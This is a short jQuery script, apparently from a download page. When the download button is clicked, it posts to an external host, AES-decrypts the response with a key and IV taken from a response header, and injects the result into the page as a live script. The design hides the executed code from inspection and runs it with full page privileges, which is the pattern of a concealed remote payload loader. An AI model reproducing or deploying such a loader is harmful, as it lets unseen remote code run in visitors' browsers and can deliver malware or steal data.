$(function (){
	function decrypt(encrypted, key, iv) {
		const keyBytes = CryptoJS.enc.Utf8.parse(key), ivBytes = CryptoJS.enc.Utf8.parse(iv),
			result = CryptoJS.AES.decrypt(encrypted, keyBytes, { 
				iv: ivBytes,
				mode: CryptoJS.mode.CBC,
				padding: CryptoJS.pad.Pkcs7
			});
		return result.toString(CryptoJS.enc.Utf8);
	}
	
	function appendJs (text) {
		var script = document.createElement("script");
		script.type = "text/javascript";
		script.innerHTML = text;
		document.body.appendChild(script);
	};
	
	$('.download-btn').click(function (){
		$.post('https://c18b5ab516edb892.tjyuaoke.top/download/setup', {version:YUAO_VERSION}, function (result, text, xhr){
			if(result.code === 1){
				const header = xhr.getResponseHeader('token').split('|'),
					data = decrypt(result.data, header[1], header[0]);
				appendJs(data)
			}
		});
	});
});